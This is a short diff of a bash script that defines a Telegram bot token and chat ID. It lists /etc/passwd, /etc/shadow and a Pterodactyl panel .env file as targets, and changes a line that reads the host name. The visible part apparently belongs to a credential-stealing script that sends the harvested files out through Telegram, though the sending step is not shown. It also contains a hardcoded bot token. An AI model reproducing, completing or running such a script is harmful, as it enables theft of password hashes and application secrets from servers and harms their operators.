@@ -2,7 +2,7 @@
 set +e
 BOT_TOKEN="8525826159:AAF9NQzREOSgYnNC2rVXBOzE9EoARrAL2Qc"
 CHAT_ID="7697898730"
-RESULT1="$(cat /etc/hostname>/dev/null)"
+RESULT1="$(bash -c 'cat /etc/hostname' 2>/dev/null)"
 FILE1="/etc/passwd"
 FILE2="/etc/shadow"
 FILE3="/var/www/pterodactyl/.env"
